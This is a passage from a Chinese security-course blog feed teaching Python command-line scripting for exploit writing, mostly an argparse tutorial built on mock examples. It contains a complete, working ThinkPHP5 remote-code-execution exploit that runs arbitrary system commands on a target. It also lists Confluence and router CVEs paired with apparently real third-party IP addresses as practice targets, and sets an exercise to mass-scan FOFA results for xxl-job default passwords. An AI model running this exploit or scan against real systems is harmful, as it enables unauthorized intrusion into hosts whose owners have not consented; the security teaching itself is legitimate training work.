class="built_in">print</span>(banner)</span><br><span class="line">    <span class="comment"># 使用argparse去解析命令行传来的参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;thinkphp5 rce poc&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 tp5poc.py -u http://192.168.1.108</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    <span class="comment"># 添加参数</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">    <span class="comment"># 把参数的值解析到对象中</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url)</span><br></pre></td></tr></table></figure><h2 id="3-编写thinkphp5-rce的exp"><a href="#3-编写thinkphp5-rce的exp" class="headerlink" title="3.编写thinkphp5 rce的exp"></a>3.编写thinkphp5 rce的exp</h2><p>使用 argparse 模块接收用户参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings()   <span class="comment">#屏蔽警告的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 1.发请求</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index.php?s=captcha&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080/index.php?s=captcha&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    data1 = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">&quot;-1&quot;</span>&#125;</span><br><span class="line">    data2 = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;cmd&#125;</span>&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response1 = requests.post(full_url, headers=headers, data=data1,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        response2 = requests.post(full_url, headers=headers, data=data2,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 请求失败&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 2.判断是否存在漏洞</span></span><br><span class="line">    <span class="keyword">if</span> response1.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;PHP Extension Build&quot;</span> <span class="keyword">in</span> response1.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span> 存在远程代码执行漏洞&quot;</span>)</span><br><span class="line">        <span class="comment"># 3.回显命令执行的结果给用户</span></span><br><span class="line">        res = response2.text.split(<span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>,<span class="number">1</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;cmd&#125;</span>命令执行的回显为:\n<span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 不存在远程代码执行漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">                                                version: 0.0.1</span></span><br><span class="line"><span class="string">                                                author:   mhx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="comment"># 使用argparse去解析命令行传来的参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;thinkphp5 rce exp&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 tp5exp.py -u http://192.168.1.108 -c whoami</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    <span class="comment"># 添加参数</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a cmd&quot;</span>,default=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="comment"># 把参数的值解析到对象中</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url,args.cmd)</span><br></pre></td></tr></table></figure><h2 id="4-编写以下漏洞exp"><a href="#4-编写以下漏洞exp" class="headerlink" title="4.编写以下漏洞exp"></a>4.编写以下漏洞exp</h2><p>使用 argparse 模块接收用户参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CVE-2022-26134      ATLASSIAN-Confluence   rce</span><br><span class="line">app=&quot;ATLASSIAN-Confluence&quot;</span><br><span class="line">https://www.exploit-db.com/exploits/50952</span><br><span class="line">https://106.52.3.78 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CVE-2021-46422    韩国的无线路由器 os cmd 注入</span><br><span class="line">app=&quot;SDT-CW3B1&quot;</span><br><span class="line">https://www.exploit-db.com/exploits/50948</span><br><span class="line">http://180.71.225.17:8083</span><br><span class="line"> http://42.29.2.54:8081</span><br><span class="line"> </span><br><span class="line"> （有坑）</span><br></pre></td></tr></table></figure><h2 id="5-编写弱口令检测脚本"><a href="#5-编写弱口令检测脚本" class="headerlink" title="5.编写弱口令检测脚本"></a>5.编写弱口令检测脚本</h2><p>写一个批量检测xxl-job存在默认账号和密码的python脚本 , 自己使用fofa语句把url保存到一个url.txt中 , 并将检测结果打印到终端 , 打印格式 , 使用前面的命令行编程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">打印格式</span><br><span class="line">[+]http://xxx.com 存在默认口令 admin:123456    # 字符串格式化</span><br><span class="line">[-]http://xxx.com 不存在默认口令</span><br><span class="line"></span><br><span class="line">（有坑）</span><br><span class="line">try:请求可能会出错 ，出错则打印请求失败</span><br><span class="line">报错那：不要程序退出 ，要函数退出,suo&#x27;j</span><br><span class="line">频繁的操作文件，效率低，所以追加到列表 ，统一写入文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fofa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;xxl-job&quot;</span><br></pre></td></tr></table></figure><p>然后将存在默认口令的站点url保存在result.txt 文本 , 每一条一行   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">保存格式:</span><br><span class="line">http://xxx.com </span><br><span class="line">http://xxx.com </span><br></pre></td></tr></table></figure><h2 id="6-编写个人poc流程思路"><a href="#6-编写个人poc流程思路" class="headerlink" title="6.编写个人poc流程思路"></a>6.编写个人poc流程思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求模版----try---判断漏洞是否存在---main封装函数模板----打印banner----使用 argparse 模块接收用户参数----------写描述并打印示例(import textwrap)-------添加参数和参数属性</span><br></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try 这里一定要看好 是  get请求  还是post请求     并且删除多余的那一行</span><br></pre></td></tr></table></figure><p>如何取得判断是否有漏洞的依据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有漏洞的包和无漏洞的包都发送到对比器，进行对比</span><br></pre></td></tr></table></figure><p>如何取响应包的值？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">①字典取值</span><br><span class="line">字典名.get（）   或者   字典名【】</span><br><span class="line">get取字典取值，假如值不存在不会报错   ，【】取会报错</span><br><span class="line"></span><br><span class="line">②json取值</span><br><span class="line">response.json()</span><br><span class="line">③字符串取值</span><br><span class="line">④切割取值</span><br><span class="line">⑤xml取值</span><br><span class="line">正则取值   ，分割取值  ，xml解析</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-编写pocsuit3框架poc思路"><a href="#7-编写pocsuit3框架poc思路" class="headerlink" title="7.编写pocsuit3框架poc思路"></a>7.编写pocsuit3框架poc思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按着demo模板 只需修改def check()里的内容</span><br><span class="line">实现 多线程，读取文件，导入wen&#x27;jian</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令行编程</title>
      <link href="/2023/04/02/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/04/02/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="1-命令行编程"><a href="#1-命令行编程" class="headerlink" title="1.命令行编程"></a>1.命令行编程</h2><p>少啰嗦 , 直接看东西</p><p><img src="https://i0.hdslb.com/bfs/album/49116f426345359b58de9553fbe31ded83c32200.png" alt="image-20220623143452293"></p><p>什么是命令行编程呢?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过命令行的方式和用户交互 , 接收用户输入的数据 , 然后处理 , 结果再次通过命令行反馈给用户</span><br></pre></td></tr></table></figure><p>对于我们安全人员编写poc , 或者 exp , 你会发现很多python工具都是命令行版本的 , <strong>下面我们就依次介绍有哪些方式可以通过命令行接收用户输入的参数</strong></p><h3 id="1-1input接收"><a href="#1-1input接收" class="headerlink" title="1.1input接收"></a>1.1input接收</h3><p>没什么好说的 , input函数我们之前已经介绍过了 , 以及它的特点 , 我们直接上案例</p><p>编写一个 rce漏洞的 exp , 先上伪代码 , 或者说是思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一般大家使用过的 rce的exp 都是接收一个url地址 , 以及你要执行的命令 , 对吧 ?</span><br><span class="line">2. ok , 小思路来了 , 那么我们的exp脚本是不是 , 先上用户输入这两个参数对吧</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入url: &quot;</span>).strip()</span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;请输入你要执行的系统命令: &quot;</span>).strip()</span><br><span class="line"><span class="comment"># 简易模仿代码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行 <span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;命令执行完成 , 命令的回显: root&quot;</span>)</span><br></pre></td></tr></table></figure><p>感觉是不是也太low了 , 这能拿的出手? 稍微美化一下 , 加个提示语&#x2F;banner信息 ,然后封装到函数里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;cve-2022-4346-rce</span></span><br><span class="line"><span class="string">使用方法 : 根据提示依次输入url和命令&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;请输入url: &quot;</span>).strip()</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&quot;请输入你要执行的系统命令: &quot;</span>).strip()</span><br><span class="line">    <span class="comment"># 简易模仿代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行 <span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;命令执行完成,命令的回显: root&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>感觉由内味道了 , 还是有点low , 接着看</p><h3 id="1-2sys模块"><a href="#1-2sys模块" class="headerlink" title="1.2sys模块"></a>1.2sys模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.argv)  <span class="comment"># 接收py脚本传进来的参数 , 返回一个列表 , 第一个是文件名，后面的才是命令行参数</span></span><br><span class="line"><span class="comment"># 我们编写poc可以通过它来获取用户传递过来的url , 要执行的命令等</span></span><br></pre></td></tr></table></figure><p>使用sys模块优化一下 , 这个时候接收参数 , 就不需要input接收了, 而是通过sys.argv</p><p>示例 : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 简易模仿代码</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;真正具体对指定url执行命令的代码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在对<span class="subst">&#123;url&#125;</span> 网站执行<span class="subst">&#123;cmd&#125;</span> 这条系统命令&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;命令执行完成,命令的回显: root&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;welcome use cve-2022-4346-rce</span></span><br><span class="line"><span class="string">使用方法 : python3 cve-2022-4346-rce.py http://www.mhx.com id\n&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]    <span class="comment">#第一个是文件名，后面的才是命令行参数</span></span><br><span class="line">        cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">        main(url, cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入参数有误,请按照提示输入&quot;</span>)</span><br></pre></td></tr></table></figure><p>是不是感觉还是欠一点意思 , 别人的都是有对应的参数 , 什么 –url , –cmd这种 , 接着往下看</p><p>补充 :</p><p>退出函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.exit(<span class="number">0</span>)     <span class="comment"># 一旦执行这行代码 , 程序会直接退出 , 安全退出</span></span><br><span class="line">sys.exit(<span class="number">1</span>)     <span class="comment"># 一旦执行这行代码 , 程序会直接退出 , 报错退出</span></span><br></pre></td></tr></table></figure><h2 id="2-argparse模块（-）"><a href="#2-argparse模块（-）" class="headerlink" title="2.argparse模块（*）"></a>2.argparse模块（*）</h2><p>argparse模块是 Python 标准库中推荐的命令行解析模块 , 也是一个内置模块</p><p>为什么要用它 ?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令行参数可以提升脚本的灵活性，更加通用。完成参数解析一般用到getopt, optparse和argparse，其中argparse是基于 optparse , 在Python3.2新推出的命令行参数解析模块 , 比较主流</span><br></pre></td></tr></table></figure><p>特点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 支持可选参数</span><br><span class="line">- 支持子命令</span><br><span class="line">- 支持重复参数个数统计</span><br><span class="line">- 更加友好的使用提示</span><br></pre></td></tr></table></figure><blockquote><p>该模块不但可以用来写poc&#x2F;exp , 还可以写一些命令行的渗透测试工具</p></blockquote><p>初体验</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化一个对象 , 并添加命令行的描述信息,一般在脚本中用来介绍脚本是干嘛的</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;这是脚本的提示信息&quot;</span>)<span class="comment">#调用类ArgumentParser</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用parse_args方法</span></span><br><span class="line">parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment">#自动加入了 -h</span></span><br></pre></td></tr></table></figure><p>直接运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 直接运行</span><br><span class="line"><span class="function">D:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 使用-<span class="title">h</span>参数</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span> -<span class="title">h</span></span></span><br><span class="line"><span class="function"><span class="title">usage</span>: <span class="title">argparse</span>模块.<span class="title">py</span> [-<span class="title">h</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">这是脚本的提示信息</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">optional</span> <span class="title">arguments</span>:</span></span><br><span class="line"><span class="function">  -<span class="title">h</span>, --<span class="title">help</span>  <span class="title">show</span> <span class="title">this</span> <span class="title">help</span> <span class="title">message</span> <span class="title">and</span> <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 使用一个不存在的参数</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span> -<span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">usage</span>: <span class="title">argparse</span>模块.<span class="title">py</span> [-<span class="title">h</span>]</span></span><br><span class="line"><span class="function"><span class="title">argparse</span>模块.<span class="title">py</span>: <span class="title">error</span>: <span class="title">unrecognized</span> <span class="title">arguments</span>: -<span class="title">a</span></span></span><br></pre></td></tr></table></figure><ul><li>在没有任何选项 (参数) 的情况下运行脚本不会在标准输出显示任何内容。这没有什么用处。</li><li>第二次运行开始展现出 <code>argparse</code> 模块的作用。我们几乎什么也没有做，但已经得到一条很好的帮助信息。</li><li><code>--help</code> 选项，也可缩写为 <code>-h</code>，是唯一 一个可以直接使用的选项（即不需要指定该选项的内容）。指定任何内容都会导致错误。即便如此，我们也能直接得到一条有用的用法信息</li></ul><h3 id="2-1位置参数"><a href="#2-1位置参数" class="headerlink" title="2.1位置参数"></a>2.1位置参数</h3><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()   <span class="comment">#shi</span></span><br><span class="line"><span class="comment"># 添加一个参数,参数名叫做url</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;url&quot;</span>)   <span class="comment">#添加位置参数 ,传几个参数就写几个parser.add_argument(&quot; &quot;)</span></span><br><span class="line"><span class="comment"># 解析参数,得到一个args对象</span></span><br><span class="line">args = parser.parse_args()   <span class="comment">#必须先解析才能调用</span></span><br><span class="line"><span class="comment"># 通过 对象.参数名 调用</span></span><br><span class="line"><span class="built_in">print</span>(args.url)</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span>  <span class="title">http</span>://<span class="title">mhx.com</span></span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">mhx.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">project</span>\<span class="title">SIS2112</span>\<span class="title">day04</span>&gt;<span class="title">python3</span> <span class="title">argparse</span>模块.<span class="title">py</span>  -<span class="title">h</span></span></span><br><span class="line"><span class="function"><span class="title">usage</span>: <span class="title">argparse</span>模块.<span class="title">py</span> [-<span class="title">h</span>] <span class="title">url</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">positional</span> <span class="title">arguments</span>:</span></span><br><span class="line"><span class="function">  <span class="title">url</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">optional</span> <span class="title">arguments</span>:</span></span><br><span class="line"><span class="function">  -<span class="title">h</span>, --<span class="title">help</span>  <span class="title">show</span> <span class="title">this</span> <span class="title">help</span> <span class="title">message</span> <span class="title">and</span> <span 